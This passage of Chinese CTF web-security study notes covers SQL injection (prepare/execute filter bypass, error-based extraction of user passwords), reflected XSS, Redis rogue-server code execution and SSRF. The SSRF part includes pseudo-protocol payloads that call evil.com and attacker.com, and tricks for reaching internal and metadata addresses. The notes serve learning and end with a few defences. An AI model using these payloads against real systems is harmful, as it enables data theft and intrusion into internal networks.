就相当于select * from admin where password=''or 1  实现sql注入

##### mid(<字符串名称>,<起始位置>,[长度])

这个可以用来查看完整的flag

##### select columns from \`\<表名\> \`

反引号`不能省略

>关于在这里使用 ` 而不是 ’ 的一些解释：
>两者在linux下和windows下不同，linux下不区分，windows下区分。
>单引号 ’ 或双引号主要用于 字符串的引用符号
>反勾号 ` 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc下面的键)
>有MYSQL保留字作为字段的，必须加上反引号来区分！！！
>如果是数值，请不要使用引号。

##### concat拼接



##### prepare

因为select被过滤了，所以先将select * from ` 1919810931114514 `进行16进制编码

再通过构造payload得

;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#

进而得到flag
prepare…from…是预处理语句，会进行编码转换。

execute用来执行由SQLPrepare创建的SQL语句。

SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。

原文链接：https://blog.csdn.net/qq_44657899/article/details/103239145



##### SQL字符替换

1．只过滤了空格
除了空格，在代码中可以代替的空白符还有%0a、%0b、%0c、%0d、%09、%a0（均为URL编码，%a0在特定字符集才能利用）和/**/组合、括号等。
在MySQL中，关键字是不区分大小写的，如果只匹配了"SELECT"，便能用大小写混写的方式轻易绕过，如"sEleCT"。

2．正则匹配
正则匹配关键字"\bselect\b"可以用形如"/！50000select/"的方式绕过

#### （二）[SQL报错注入](https://blog.csdn.net/qq_62539372/article/details/125423579)

##### BigInt数据类型溢出：

exp(int)函数返回e的x次方，当x的值足够大的时候就会导致函数的结果数据类型溢出，也就会因此报错："DOUBLE value is out of range"

例：

?id=1" and exp(~(select * from (select user())a)) --+
先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a

然后在查询select * from a 查询a，将结果集a全部查询出来

查询完成，语句成功执行，返回值为0，再取反(~按位取反运算符)，exp调用的时候e的那个数的次方，就会造成BigInt大数据类型溢出，就会报错

payload：

获取表名：

```sql
?id=1" and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a)) --+
//获取列名：

?id=1" and exp(~(select * from (select column_name from information_schema.columns where table_name='users' limit 0,1)a)) --+
//获取列名对应信息：

?id=1" and exp(~(select * from(select username from 'users' limit 0,1))) --+
```

适用mysql数据库版本是：5.5.5~5.5.49

除了exp()函数之外，pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入


##### 函数参数格式错误：

两个重要函数：updatexml（） extractvalue ()

我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错

updatexml()函数语法：updatexml(XML_document,Xpath_string,new_value)

XML_document:是字符串String格式，为XML文档对象名称

Xpath_string:Xpath格式的字符串

new_value:string格式，替换查找到的符合条件的数据

查询当前数据库的用户信息以及数据库版本信息:

```sql
?id=1" and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+
```
获取当前数据库下数据表信息：
```sql
?id=1" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+
```

获取users表名的列名信息：

```sql
?id=1" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),3) --+
```

获取users数据表下username、password两列名的用户字段信息:

```sql
?id=1" and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+

?id=1" and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+
```

extractvalue()函数语法:extractvalue(XML_document,XPath_string)

获取当前是数据库名称及使用mysql数据库的版本信息：

```sql
?id=1" and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+
```

获取当前位置所用数据库的位置：

```sql
?id=1" and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+
```

获取表名：

```sql
?id=1" and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+
```

获取users表的列名：

```sql
?id=1" and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e)) --+
```

获取对应的列名的信息(username/password):

```sql
?id=1" and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+
```

#### （三）常见函数

##### 1.concat_();

concat ()方法用于连接两个或多个数组。
该方法不会改变现有的数组，而仅仅会返回被连接数组的一个副本。
返回一个新的数组。该数组是通过把所有 arrayX 参数添加到 arrayObject 中生成的。如果要进行 concat 操作的参数是数组，那么添加的是数组中的元素，而不是数组。

### 五、XSS注入

[XSS注入_Fenizal的博客-CSDN博客_xss注入](https://blog.csdn.net/weixin_47785246/article/details/123006240)

#### （〇）反射型XSS

测试

```
<script>alert("xss");</script>
```



### 六、服务应用漏洞

##### （一）Node.js漏洞

https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html

##### （二）redis命令执行

[redis未授权访问漏洞三种提权方式](https://blog.csdn.net/fryhrx/article/details/124087653)

例题：

[NSSCTF - \[天翼杯 2021]esay_eval (ctfer.vip)](https://www.ctfer.vip/problem/364)

通过找到redis密码，使用蚁剑插件进行链接，MODULE LOAD命令，在命令行下运行恶意脚本exp.so[GitHub - Dliv3/redis-rogue-server: Redis 4.x/5.x RCE](https://github.com/Dliv3/redis-rogue-server)，之后使用system.exec "<执行的命令>"来获得终端权限。

### 七、SSRF

#### （一）SSRF是什么？

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。

一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

#### （二）SSRF漏洞原理

SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。


比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器

#### （三）SSRF漏洞挖掘

1、分享：通过URL地址分享网页内容


2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。

3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。
4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。

http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de

例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。

5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。


6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。

(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。

7、从URL关键字中寻找
利用google 语法加上这些关键字去寻找SSRF漏洞
```
share
wap
url
link
src
source
target
u
display
sourceURl
imageURL
domain
```
简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞

#### （四）产生SSRF漏洞的函数

SSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在SSRF漏洞的函数。

1、file_get_contents:

下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。
```php
<?php
if (isset($_POST['url'])) 
{ 
$content = file_get_contents($_POST['url']); 
$filename ='./images/'.rand().';img1.jpg'; 
file_put_contents($filename, $content); 
echo $_POST['url']; 
$img = "<img src=\"".$filename."\"/>"; 
} 
echo $img; 
?>
```
2、sockopen():

以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。
```php
<?php 
function GetFile($host,$port,$link) 
{ 
$fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
if (!$fp) { 
echo "$errstr (error number $errno) \n"; 
} else { 
$out = "GET $link HTTP/1.1\r\n"; 
$out .= "Host: $host\r\n"; 
$out .= "Connection: Close\r\n\r\n"; 
$out .= "\r\n"; 
fwrite($fp, $out); 
$contents=''; 
while (!feof($fp)) { 
$contents.= fgets($fp, 1024); 
} 
fclose($fp); 
return $contents; 
} 
}
?>
```

3、curl_exec():

cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。
```php
<?php 
if (isset($_POST['url']))
{
$link = $_POST['url'];
$curlobj = curl_init();
curl_setopt($curlobj, CURLOPT_POST, 0);
curl_setopt($curlobj,CURLOPT_URL,$link);
curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($curlobj);
curl_close($curlobj);

$filename = './curled/'.rand().'.txt';
file_put_contents($filename, $result); 
echo $result;
}
?>
```

注意事项

一般情况下PHP不会开启fopen的gopher wrapper
file_get_contents的gopher协议不能URL编码
file_get_contents关于Gopher的302跳转会出现bug，导致利用失败
curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用
curl_exec() 默认不跟踪跳转，
file_get_contents() file_get_contents支持php://input协议

五、SSRF中URL的伪协议
当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议

file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
sftp:// SSH文件传输协议或安全文件传输协议
ldap:// 轻量级目录访问协议
tftp:// 简单文件传输协议
gopher:// 分布式文档传递服务，可使用gopherus生成payload

1、file

这种URL Schema可以尝试从文件系统中获取文件：

http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini

如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：

2、dict

这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：

http://example.com/ssrf.php?dict://evil.com:1337/
evil.com:$ nc -lvp 1337
Connection from [192.168.0.12] port 1337[tcp/*]
accepted (family 2, sport 31126)CLIENT libcurl 7.40.0

3、sftp

在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。

http://example.com/ssrf.php?url=sftp://evil.com:1337/
evil.com:$ nc -lvp 1337
Connection from [192.168.0.12] port 1337[tcp/*]
accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2

4、ldap://或ldaps:// 或ldapi://

LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。

http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit

5、tftp://

TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。

http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
evil.com:# nc -lvup 1337
Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3

6、gopher://

Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。

http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-<?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?>
evil.com:# nc -lvp 1337
Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest

#### （六）SRF漏洞利用（危害）
1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;

2.攻击运行在内网或本地的应用程序（比如溢出）;

3.对内网web应用进行指纹识别，通过访问默认文件实现;

4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;

5.利用file协议读取本地文件等。.

6.各个协议调用探针：http,file,dict,ftp,gopher等

http:192.168.64.144/phpmyadmin/
file:///D:/www.txt
dict://192.168.64.144:3306/info
ftp://192.168.64.144:21

#### （七）SSRF绕过方式

部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：

##### 一、常见的绕过方式

###### 1、限制为http://www.xxx.com 域名时（利用@）

可以尝试采用http基本身份认证的方式绕过
如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异
在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。

###### 2.采用短网址绕过

比如百度短地址https://dwz.cn/

###### 3.采用进制转换

127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.

###### 4.利用特殊域名

原理是DNS解析。xip.io可以指向任意域名，即
127.0.0.1.xip.io，可解析为127.0.0.1
(xip.io 现在好像用不了了，可以找找其他的)

###### 5.利用[::]

可以利用[::]来绕过localhost
http://169.254.169.254>>http://[::169.254.169.254]

###### 6.利用句号

127。0。0。1 >>> 127.0.0.1

###### 7、CRLF 编码绕过

%0d->0x0d->\r回车
%0a->0x0a->\n换行
进行HTTP头部注入

example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a 
1
8.利用封闭的字母数字

利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> example.com
http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

##### 二、常见限制

###### 1.限制为http://www.xxx.com 域名

采用http基本身份认证的方式绕过，即@
http://www.xxx.com@www.xxc.com

###### 2.限制请求IP不为内网地址

当不允许ip为内网地址时：
（1）采取短网址绕过
（2）采取特殊域名
（3）采取进制转换

###### 3.限制请求只为http协议

（1）采取302跳转
（2）采取短地址

#### （八）SSRF漏防御

通常有以下5个思路：

1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。

3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。

4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。

5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。



### 九、博客与资料

[web好用的博客](https://blog.csdn.net/kingdring/category_10553279.html)

[SQL注入](https://www.cnblogs.com/WorldNoBug/p/16392849.html)

https://baijiahao.baidu.com/s?id=1708490381793968403&wfr=spider&for=pc

https://blog.csdn.net/qq_44159028/article/details/114325805

[SQL语句大全](https://blog.csdn.net/weixin_37990128/article/details/109165556)

[--+](https://blog.csdn.net/qq_44159028/article/details/114808681)

[图解SQL](http://www.gosanye.com/post/12165.html)

[MySQL教程](https://www.w3school.com.cn/sql/index.asp)

[知乎的教程](https://zhuanlan.zhihu.com/p/320579411)

[SSRF](https://blog.csdn.net/qq_43378996/article/details/124050308)

[工具库](/101.43.173.4:5212/s/rMig?path=%2FCTF)



space=admin&
